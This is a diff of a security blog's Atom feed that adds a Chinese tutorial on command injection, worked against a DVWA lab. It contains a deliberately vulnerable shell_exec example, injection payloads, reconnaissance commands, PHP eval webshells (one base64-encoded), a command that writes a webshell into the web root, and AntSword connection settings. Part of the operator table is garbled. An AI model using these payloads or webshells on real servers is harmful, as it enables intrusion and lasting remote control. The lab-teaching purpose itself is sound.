@@ -3,29 +3,255 @@
     <id>https://bae-ace.github.io</id>
     <title>bae的博客 • Posts by &#34;漏洞利用&#34; category</title>
     <link href="https://bae-ace.github.io" />
-    <updated>2025-07-23T23:51:59.000Z</updated>
+    <updated>2025-07-26T10:53:13.000Z</updated>
+    <category term="工具" />
+    <category term="sqlmap" />
+    <category term="渗透测试" />
     <category term="PWN" />
     <category term="ELF" />
     <category term="ROP" />
     <category term="CTF" />
     <category term="二进制安全" />
     <category term="Web安全" />
-    <category term="Struts2" />
-    <category term="RCE" />
-    <category term="漏洞复现" />
-    <category term="OGNL注入" />
     <category term="SQL注入" />
-    <category term="渗透测试" />
     <category term="网络安全" />
     <category term="hexo" />
     <category term="博客搭建" />
     <category term="初始测试" />
+    <category term="Struts2" />
+    <category term="RCE" />
+    <category term="漏洞复现" />
+    <category term="OGNL注入" />
     <category term="linux" />
     <category term="命令" />
+    <category term="命令执行" />
+    <category term="漏洞利用" />
     <category term="信息收集" />
     <category term="子域名" />
-    <category term="工具" />
-    <category term="sqlmap" />
+    <entry>
+        <id>https://bae-ace.github.io/2025/07/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</id>
+        <title>命令执行漏洞</title>
+        <link rel="alternate" href="https://bae-ace.github.io/2025/07/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
+        <content type="html">&lt;h1 id=&#34;命令执行漏洞详解&#34;&gt;&lt;a href=&#34;#命令执行漏洞详解&#34; class=&#34;headerlink&#34; title=&#34;命令执行漏洞详解&#34;&gt;&lt;/a&gt;命令执行漏洞详解&lt;/h1&gt;&lt;h2 id=&#34;🎯-前言&#34;&gt;&lt;a href=&#34;#🎯-前言&#34; class=&#34;headerlink&#34; title=&#34;🎯 前言&#34;&gt;&lt;/a&gt;🎯 前言&lt;/h2&gt;&lt;p&gt;命令执行漏洞是Web安全领域中的一种高危漏洞，它允许攻击者在目标服务器上执行任意系统命令。本文将深入解析命令执行漏洞的原理、成因、利用方法以及防护策略，并通过DVWA靶场环境进行实战演示。&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;📋-目录&#34;&gt;&lt;a href=&#34;#📋-目录&#34; class=&#34;headerlink&#34; title=&#34;📋 目录&#34;&gt;&lt;/a&gt;📋 目录&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;&lt;a href=&#34;https://claude.ai/chat/d5068d44-b35a-4d8e-9e2d-89fe67d23495#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0&#34;&gt;漏洞概述&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://claude.ai/chat/d5068d44-b35a-4d8e-9e2d-89fe67d23495#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86&#34;&gt;漏洞原理&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://claude.ai/chat/d5068d44-b35a-4d8e-9e2d-89fe67d23495#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA&#34;&gt;环境搭建&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://claude.ai/chat/d5068d44-b35a-4d8e-9e2d-89fe67d23495#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98&#34;&gt;漏洞利用实战&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://claude.ai/chat/d5068d44-b35a-4d8e-9e2d-89fe67d23495#%E5%90%8E%E6%B8%97%E9%80%8F%E6%93%8D%E4%BD%9C&#34;&gt;后渗透操作&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://claude.ai/chat/d5068d44-b35a-4d8e-9e2d-89fe67d23495#%E9%98%B2%E6%8A%A4%E6%8E%AA%E6%96%BD&#34;&gt;防护措施&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://claude.ai/chat/d5068d44-b35a-4d8e-9e2d-89fe67d23495#%E6%80%BB%E7%BB%93&#34;&gt;总结&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;🔍-漏洞概述&#34;&gt;&lt;a href=&#34;#🔍-漏洞概述&#34; class=&#34;headerlink&#34; title=&#34;🔍 漏洞概述&#34;&gt;&lt;/a&gt;🔍 漏洞概述&lt;/h2&gt;&lt;h3 id=&#34;什么是命令执行漏洞？&#34;&gt;&lt;a href=&#34;#什么是命令执行漏洞？&#34; class=&#34;headerlink&#34; title=&#34;什么是命令执行漏洞？&#34;&gt;&lt;/a&gt;什么是命令执行漏洞？&lt;/h3&gt;&lt;p&gt;命令执行漏洞（Command Execution&amp;#x2F;Command Injection）是指当Web应用程序需要调用系统命令来完成某些功能时，由于对用户输入的过滤不严格，导致攻击者可以构造恶意的命令参数，从而在服务器上执行任意系统命令的安全漏洞。&lt;/p&gt;
+&lt;h3 id=&#34;漏洞危害&#34;&gt;&lt;a href=&#34;#漏洞危害&#34; class=&#34;headerlink&#34; title=&#34;漏洞危害&#34;&gt;&lt;/a&gt;漏洞危害&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;服务器完全控制&lt;/strong&gt;：获得服务器的命令执行权限&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;数据泄露&lt;/strong&gt;：访问敏感文件和数据库信息&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;权限提升&lt;/strong&gt;：通过系统漏洞进一步提升权限&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;横向移动&lt;/strong&gt;：以被攻陷服务器为跳板攻击内网其他系统&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;恶意软件植入&lt;/strong&gt;：上传后门程序或恶意软件&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;⚙️-漏洞原理&#34;&gt;&lt;a href=&#34;#⚙️-漏洞原理&#34; class=&#34;headerlink&#34; title=&#34;⚙️ 漏洞原理&#34;&gt;&lt;/a&gt;⚙️ 漏洞原理&lt;/h2&gt;&lt;h3 id=&#34;技术原理&#34;&gt;&lt;a href=&#34;#技术原理&#34; class=&#34;headerlink&#34; title=&#34;技术原理&#34;&gt;&lt;/a&gt;技术原理&lt;/h3&gt;&lt;p&gt;命令执行漏洞的根本原因在于应用程序直接将用户输入作为系统命令的参数，而没有进行适当的过滤和验证。&lt;/p&gt;
+&lt;h4 id=&#34;典型的脆弱代码示例：&#34;&gt;&lt;a href=&#34;#典型的脆弱代码示例：&#34; class=&#34;headerlink&#34; title=&#34;典型的脆弱代码示例：&#34;&gt;&lt;/a&gt;典型的脆弱代码示例：&lt;/h4&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// 获取用户输入的IP地址&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$target&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_REQUEST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;ip&amp;#x27;&lt;/span&gt;];&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// 直接将用户输入拼接到系统命令中&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$cmd&lt;/span&gt; = &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;shell_exec&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;ping -c 4 &amp;#x27;&lt;/span&gt; . &lt;span class=&#34;hljs-variable&#34;&gt;$target&lt;/span&gt;);&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// 输出结果&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;lt;pre&amp;gt;&lt;span class=&#34;hljs-subst&#34;&gt;$cmd&lt;/span&gt;&amp;lt;/pre&amp;gt;&amp;quot;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h3 id=&#34;命令连接符&#34;&gt;&lt;a href=&#34;#命令连接符&#34; class=&#34;headerlink&#34; title=&#34;命令连接符&#34;&gt;&lt;/a&gt;命令连接符&lt;/h3&gt;&lt;p&gt;攻击者通常利用以下命令连接符来注入恶意命令：&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;连接符&lt;/th&gt;
+&lt;th&gt;说明&lt;/th&gt;
+&lt;th&gt;示例&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;;&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;命令分隔符&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;127.0.0.1; whoami&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;逻辑与，前一个命令成功后执行后一个&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;127.0.0.1 &amp;amp;&amp;amp; whoami&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&amp;#96;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;&amp;#96;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&amp;#96;&lt;/td&gt;
+&lt;td&gt;&amp;#96;&lt;/td&gt;
+&lt;td&gt;管道符，将前一个命令的输出作为后一个命令的输入&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;&amp;amp;&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;后台执行&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;127.0.0.1 &amp;amp; whoami&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;$()&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;命令替换&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;127.0.0.1$(whoami)&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt; &lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;反引号命令替换&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;127.0.0.1&lt;/code&gt;whoami&lt;code&gt; &lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;&lt;/table&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;🌐-环境搭建&#34;&gt;&lt;a href=&#34;#🌐-环境搭建&#34; class=&#34;headerlink&#34; title=&#34;🌐 环境搭建&#34;&gt;&lt;/a&gt;🌐 环境搭建&lt;/h2&gt;&lt;h3 id=&#34;靶场环境配置&#34;&gt;&lt;a href=&#34;#靶场环境配置&#34; class=&#34;headerlink&#34; title=&#34;靶场环境配置&#34;&gt;&lt;/a&gt;靶场环境配置&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;系统环境：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;操作系统：Windows 7&lt;/li&gt;
+&lt;li&gt;Web服务器：PHPStudy&lt;/li&gt;
+&lt;li&gt;靶场程序：DVWA&lt;/li&gt;
+&lt;li&gt;DVWA路径：&lt;code&gt;C:\download\phpstudy\phpstudy_pro\WWW\DVWA&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;访问地址：&lt;code&gt;http://192.168.147.136/DVWA/&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;环境准备步骤&#34;&gt;&lt;a href=&#34;#环境准备步骤&#34; class=&#34;headerlink&#34; title=&#34;环境准备步骤&#34;&gt;&lt;/a&gt;环境准备步骤&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;安装PHPStudy&lt;/strong&gt;&lt;ul&gt;
+&lt;li&gt;下载并安装PHPStudy集成环境&lt;/li&gt;
+&lt;li&gt;启动Apache和MySQL服务&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;部署DVWA&lt;/strong&gt;&lt;ul&gt;
+&lt;li&gt;下载DVWA源码&lt;/li&gt;
+&lt;li&gt;解压到PHPStudy的WWW目录&lt;/li&gt;
+&lt;li&gt;配置数据库连接&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;设置安全等级&lt;/strong&gt;&lt;ul&gt;
+&lt;li&gt;登录DVWA管理界面&lt;/li&gt;
+&lt;li&gt;导航至DVWA Security&lt;/li&gt;
+&lt;li&gt;将安全等级设置为Low&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;💥-漏洞利用实战&#34;&gt;&lt;a href=&#34;#💥-漏洞利用实战&#34; class=&#34;headerlink&#34; title=&#34;💥 漏洞利用实战&#34;&gt;&lt;/a&gt;💥 漏洞利用实战&lt;/h2&gt;&lt;h3 id=&#34;第一步：访问漏洞页面&#34;&gt;&lt;a href=&#34;#第一步：访问漏洞页面&#34; class=&#34;headerlink&#34; title=&#34;第一步：访问漏洞页面&#34;&gt;&lt;/a&gt;第一步：访问漏洞页面&lt;/h3&gt;&lt;p&gt;打开浏览器访问命令执行漏洞测试页面：&lt;/p&gt;
+&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;http:&lt;span class=&#34;hljs-regexp&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;192.168&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;147.136&lt;/span&gt;&lt;span class=&#34;hljs-regexp&#34;&gt;/DVWA/&lt;/span&gt;vulnerabilities&lt;span class=&#34;hljs-regexp&#34;&gt;/exec/&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h3 id=&#34;第二步：基础命令注入测试&#34;&gt;&lt;a href=&#34;#第二步：基础命令注入测试&#34; class=&#34;headerlink&#34; title=&#34;第二步：基础命令注入测试&#34;&gt;&lt;/a&gt;第二步：基础命令注入测试&lt;/h3&gt;&lt;p&gt;在输入框中输入以下Payload进行测试：&lt;/p&gt;
+&lt;figure class=&#34;highlight accesslog&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs accesslog&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;127.0.0.1&lt;/span&gt; &amp;amp;&amp;amp; whoami&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;预期结果：&lt;/strong&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight routeros&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs routeros&#34;&gt;PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.&lt;br&gt;64 bytes &lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; 127.0.0.1: &lt;span class=&#34;hljs-attribute&#34;&gt;icmp_seq&lt;/span&gt;=1 &lt;span class=&#34;hljs-attribute&#34;&gt;ttl&lt;/span&gt;=64 &lt;span class=&#34;hljs-attribute&#34;&gt;time&lt;/span&gt;=0.042 ms&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;..&lt;/span&gt;.&lt;br&gt;&lt;br&gt;nt authority\system&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;如果看到&lt;code&gt;nt authority\system&lt;/code&gt;输出，说明命令注入成功！&lt;/p&gt;
+&lt;h3 id=&#34;第三步：信息收集&#34;&gt;&lt;a href=&#34;#第三步：信息收集&#34; class=&#34;headerlink&#34; title=&#34;第三步：信息收集&#34;&gt;&lt;/a&gt;第三步：信息收集&lt;/h3&gt;&lt;p&gt;使用不同的命令收集系统信息：&lt;/p&gt;
+&lt;figure class=&#34;highlight ruby&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs ruby&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 查看当前用户&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;127.0&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;0.1&lt;/span&gt; &amp;amp;&amp;amp; whoami&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 查看系统信息&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;127.0&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;0.1&lt;/span&gt; &amp;amp;&amp;amp; systeminfo&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 查看网络配置&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;127.0&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;0.1&lt;/span&gt; &amp;amp;&amp;amp; ipconfig&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 查看当前目录&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;127.0&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;0.1&lt;/span&gt; &amp;amp;&amp;amp; dir&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 查看进程列表&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;127.0&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;0.1&lt;/span&gt; &amp;amp;&amp;amp; tasklist&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;hr&gt;
+&lt;h2 id=&#34;🎯-后渗透操作&#34;&gt;&lt;a href=&#34;#🎯-后渗透操作&#34; class=&#34;headerlink&#34; title=&#34;🎯 后渗透操作&#34;&gt;&lt;/a&gt;🎯 后渗透操作&lt;/h2&gt;&lt;h3 id=&#34;方法一：上传Webshell&#34;&gt;&lt;a href=&#34;#方法一：上传Webshell&#34; class=&#34;headerlink&#34; title=&#34;方法一：上传Webshell&#34;&gt;&lt;/a&gt;方法一：上传Webshell&lt;/h3&gt;&lt;h4 id=&#34;1-准备一句话木马&#34;&gt;&lt;a href=&#34;#1-准备一句话木马&#34; class=&#34;headerlink&#34; title=&#34;1. 准备一句话木马&#34;&gt;&lt;/a&gt;1. 准备一句话木马&lt;/h4&gt;&lt;p&gt;创建&lt;code&gt;shell.php&lt;/code&gt;文件：&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt; @&lt;span class=&#34;hljs-keyword&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;pass&amp;#x27;&lt;/span&gt;]); &lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;或者使用Base64编码版本：&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;base64_decode&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;cmd&amp;#x27;&lt;/span&gt;])); &lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h4 id=&#34;2-通过命令注入上传&#34;&gt;&lt;a href=&#34;#2-通过命令注入上传&#34; class=&#34;headerlink&#34; title=&#34;2. 通过命令注入上传&#34;&gt;&lt;/a&gt;2. 通过命令注入上传&lt;/h4&gt;&lt;p&gt;使用echo命令写入一句话木马：&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;127.0&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;0.1&lt;/span&gt; &amp;amp;&amp;amp; &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; ^&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt; @&lt;span class=&#34;hljs-keyword&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;pass&amp;#x27;&lt;/span&gt;]); ?^&amp;gt; &amp;gt; C:\download\phpstudy\phpstudy_pro\WWW\DVWA\shell.php&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;注意事项：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;^&lt;/code&gt;符号是Windows cmd的转义符&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;gt;&lt;/code&gt;符号用于重定向输出到文件&lt;/li&gt;
+&lt;li&gt;路径必须是Web目录下可访问的位置&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;3-验证上传成功&#34;&gt;&lt;a href=&#34;#3-验证上传成功&#34; class=&#34;headerlink&#34; title=&#34;3. 验证上传成功&#34;&gt;&lt;/a&gt;3. 验证上传成功&lt;/h4&gt;&lt;p&gt;访问上传的木马文件：&lt;/p&gt;
+&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;http:&lt;span class=&#34;hljs-regexp&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;192.168&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;147.136&lt;/span&gt;&lt;span class=&#34;hljs-regexp&#34;&gt;/DVWA/&lt;/span&gt;shell.php&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;如果页面显示空白，说明PHP文件上传成功。&lt;/p&gt;
+&lt;h3 id=&#34;方法二：使用蚁剑连接&#34;&gt;&lt;a href=&#34;#方法二：使用蚁剑连接&#34; class=&#34;headerlink&#34; title=&#34;方法二：使用蚁剑连接&#34;&gt;&lt;/a&gt;方法二：使用蚁剑连接&lt;/h3&gt;&lt;h4 id=&#34;1-配置蚁剑连接&#34;&gt;&lt;a href=&#34;#1-配置蚁剑连接&#34; class=&#34;headerlink&#34; title=&#34;1. 配置蚁剑连接&#34;&gt;&lt;/a&gt;1. 配置蚁剑连接&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;连接参数：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;URL: &lt;code&gt;http://192.168.147.136/DVWA/shell.php&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;密码: &lt;code&gt;pass&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;编码: &lt;code&gt;UTF-8&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;类型: &lt;code&gt;PHP&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
